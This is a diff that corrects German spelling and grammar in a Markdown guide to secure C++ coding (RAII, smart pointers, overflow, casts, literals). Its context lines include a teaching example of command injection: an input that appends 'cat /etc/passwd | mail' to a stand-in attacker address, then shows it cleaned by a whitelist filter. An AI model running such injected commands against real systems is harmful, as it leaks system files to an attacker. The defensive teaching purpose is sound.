@@ -28,7 +28,7 @@
   * [Zweiter Tipp für Pufferüberlauf: Verwende ausschließlich &bdquo;*secure*&rdquo; Funktionen](#link15)
   * [Drei Tipps für arithmetischen Überlauf](#link16)
   * [Noch ein Tipp für arithmetischen Überlauf: `std::midpoint`](#link17)
-  * [Verhindere ungültige Zeichenketteninjektionen (so genannte *SQL Injections*)](#link18)
+  * [Verhindere ungültige Zeichenketteninjektionen (sogenannte *SQL Injections*)](#link18)
   * [Vermeide &bdquo;*Off-by-One*&rdquo; Fehler!](#link19)
   * [Verwende STL-Algorithmen](#link20)
   * [Verwende STL-Container](#link21)
@@ -59,7 +59,7 @@ RAII steht für *Resource Acquisition Is Initialization* (*Ressourcenerwerb ist I
 Damit möchte man zum Ausdruck bringen, dass Ressourcen automatisch erworben werden,
 wenn ein Objekt erstellt wird, und automatisch freigegeben werden, wenn das Objekt zerstört wird.
 
-Verwenden Sie RAII, um Ressourcenlecks und Speicherfehler zu vermeiden.
+Verwenden Sie RAII, um Ressourcen Lecks und Speicherfehler zu vermeiden.
 
 ### Verwende *Smart Pointer* <a name="link2"></a>
 
@@ -70,7 +70,7 @@ Verwenden Sie *Smart Pointer*, um Speicherlecks und &bdquo;Dangling&rdquo;&ndash
 
 ### Verwende das Schlüsselwort `auto` <a name="link3"></a>
 
-Verwenden das Schlüsselwort `auto`, um Typkonflikte zu vermeiden und um den Code übersichtlicher
+Verwende das Schlüsselwort `auto`, um Typkonflikte zu vermeiden und um den Code übersichtlicher
 und weniger fehleranfällig zu machen.
 
 
@@ -154,7 +154,7 @@ und generiert häufig schnelleren Code.
 Diese Aussage findet sich auch in den [C++ Core Guidelines](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines)
 wieder: *Prefer C++ to C* (*CPL.1*).
 
-Zur Illustration vergleiche man das Konkatenieren zweier Zeichenketten:
+Zur Illustration vergleiche man die Konkatenation zweier Zeichenketten:
 Einmal in C++ geschrieben und ein zweites Mal in C:
 
 *Beispiel*: C
@@ -197,7 +197,7 @@ Dies minimiert mögliche Nischenprobleme des einen oder anderen Übersetzers.
 
 Vermutlich durften Sie diesen Hinweis schon oft über sich ergehen lassen:
 Vermeiden Sie &ndash; so gut es geht &ndash; jegliche Warnungen, die ihr Übersetzer in ihrem Projekt erzeugt.
-In den allermeisten Fällen ist eine Warnung ein Hinweis, dass mit Ihrem Quellcode an dieser Stelle etwas nicht in Ordnung ist.
+In den meisten Fällen ist eine Warnung ein Hinweis, dass mit Ihrem Quellcode an dieser Stelle etwas nicht in Ordnung ist.
 Nehmen Sie Warnungen nicht auf die leichte Schulter:
 
 Eine Kostprobe:
@@ -643,18 +643,18 @@ Correct:                           4294967294
 
 ---
 
-### Verhindere ungültige Zeichenketteninjektionen (so genannte *SQL Injections*) <a name="link18"></a>
+### Verhindere ungültige Zeichenketteninjektionen (sogenannte *SQL Injections*) <a name="link18"></a>
 
 Das Durchreichen von Zeichenketten an Subsysteme ist mit äußerster Vorsicht zu bewerkstelligen.
 
-So genannte *SQL-Injection*-Angriffe sind eine der ältesten Schwachstellen in derartigen Programmen.
+Sogenannte *SQL-Injection*-Angriffe sind eine der ältesten Schwachstellen in derartigen Programmen.
 
 Eine SQL-Injection ist eine Art von Sicherheitslücke,
 bei der ein Angreifer einen Teil des SQL-Codes (*Structured Query Language*) verwendet,
 um eine Datenbank zu manipulieren und um Zugriff auf potenziell wertvolle Informationen zu erhalten.
 Dies ist eine der häufigsten und bedrohlichsten Angriffsarten, da sie potenziell gegen jedes Programm oder jede Webseite eingesetzt werden kann.
 
-Neben SQL-Inkektionen kann die Zeichenkette auch ein (Unix/Linux)-Shell-Kommando darstellen,
+Neben SQL-Injektionen kann die Zeichenkette auch ein (Unix/Linux)-Shell-Kommando darstellen,
 was an dieser Stelle ebenfalls einen Angriff darstellt.
 
 *Beispiel*:
@@ -681,7 +681,7 @@ Buffer (Input):   /bin/mail bogus@addr.com; cat /etc/passwd | mail somebadguy.ne
 
 *Lösung*:
 
-Jegliche Form eine Benutzereingabe ist zu validieren.
+Jegliche Form einer Benutzereingabe ist zu validieren!
 
 In diesem Zusammenhang gibt es den Begriff der &bdquo;Whitelist&rdquo;:
 Hierunter versteht man eine Art &bdquo;weiße Liste&rdquo;, eine Art Filter,
@@ -727,7 +727,7 @@ der die sicheren Daten beschreibt und filtert.
 35: }
 ```
 
-Die so genannte &bdquo;Whitelist&rdquo; finden wir in dem Programmausschnitt
+Die sogenannte &bdquo;Whitelist&rdquo; finden wir in dem Programmausschnitt
 in den Zeilen 4 bis 6 vor: Eine Menge aller zulässigen Zeichen in diesem Beispiel.
 
 *Ausgabe*:
@@ -745,7 +745,7 @@ Buffer (Cleaned): _bin_mail_bogus@addr_com__cat__etc_passwd___mail_somebadguy_ne
 Vermeiden Sie &bdquo;*Off-by-One*&rdquo; Fehler!
 Natürlich ist das leichter getan als gesagt. 
 
-Eine Option besteht &ndash; wenn gleich das für das gesamte Spektrum der Entwicklung von Software gilt &ndash; darin,
+Eine Option besteht &ndash; wenngleich das für das gesamte Spektrum der Entwicklung von Software gilt &ndash; darin,
 jede Zeile des Quellcodes mit dem Debugger zu durchlaufen!
 
 
@@ -825,7 +825,7 @@ Algorithmen der STL sind robuster im Gebrauch als CRT-Bibliotheksfunktionen oder
 *Hinweis*:
 Vermeiden Sie generell *manuelle* Wiederholungsschleifen!
 
-Verwenden Sie Algorithmen der STL und, wenn es eine Wiederholungsschleife sein muss, die so genannten C++ *Range-based Loop*:
+Verwenden Sie Algorithmen der STL und, wenn es eine Wiederholungsschleife sein muss, die sogenannten C++ *Range-based Loop*:
 Beide kommen ohne Schleifen-Indizes aus, die eine häufige Ursache von Fehlerquellen sind.
 
 ---
@@ -841,7 +841,7 @@ Beide kommen ohne Schleifen-Indizes aus, die eine häufige Ursache von Fehlerquel
 
 ### Achte auf sicheres *Downcasting* <a name="link22"></a>
 
-An Stelle der unsicheren C-Cast Operatoren sollten man die sicheren C++-Cast Operatoren verwenden.
+An Stelle der unsicheren C-Cast Operatoren sollte man die sicheren C++-Cast Operatoren verwenden.
 
 Ein Beispiel ist der Gebrauch von `static_cast`:
 
@@ -881,7 +881,7 @@ Ein Beispiel ist der Gebrauch von `static_cast`:
 Das letzte Code-Fragment ist in C übersetzungsfähig !!! 
 Dabei müssen diese Anweisungen natürlich in einer Datei mit der Endung &bdquo;.c&rdquo; stehen.
 
-Dieselben Anweisung sind in C++ nicht übersetzungsfähig!
+Dieselben Anweisungen sind in C++ nicht übersetzungsfähig!
 
 ---
 
@@ -908,7 +908,7 @@ Wer hat wann und wo `delete` aufgerufen?
 ### Deklariere Konstruktoren mit einem einzigen Argument mit `explicit` <a name="link24"></a>
 
 Standardmäßig sollten Konstruktoren mit einem Argument als `explicit` deklariert werden.
-Damit kann man unbeabsichtige Konvertierungen &ndash; und damit Überraschungen &ndash; vermeiden:
+Damit kann man unbeabsichtigte Konvertierungen &ndash; und damit Überraschungen &ndash; vermeiden:
 
 ```cpp
 01: class String {
@@ -927,7 +927,7 @@ Damit kann man unbeabsichtige Konvertierungen &ndash; und damit Überraschungen &
 14: }
 ```
 
-Fügt man das Schlüsselwort vor dem Konstruktor hinzu, ist die `test`-Funktion nicht mehr übersetzungfähig:
+Fügt man das Schlüsselwort vor dem Konstruktor hinzu, ist die `test`-Funktion nicht mehr übersetzungsfähig:
 
 ```cpp
 explicit String(size_t length) : m_length{ length } {}; 
@@ -1031,7 +1031,7 @@ Man sollte `size_t` einsetzen
 
 ### Benutzerdefinierte Literale: Elementare Datentypen &bdquo;mit Bedeutung&rdquo; <a name="link27"></a>
 
-In C++ lassen sich `int`-Werte (oder auch Werte anderen Datentyps) durch die so genannte *User Defined Literal* Syntax
+In C++ lassen sich `int`-Werte (oder auch Werte anderen Datentyps) durch die sogenannte *User Defined Literal* Syntax
 erheblich lesbarer gestalten:
 
 *Beispiel*:
@@ -1042,7 +1042,7 @@ erheblich lesbarer gestalten:
 03: // auto wrong = h + d;   // doesn't compile: Error
 ```
 
-Dazu bedarf es einer Implementierung des so genannten *Literal*-Operators:
+Dazu bedarf es einer Implementierung des sogenannten *Literal*-Operators:
 
 ```cpp
 01: class Hours{
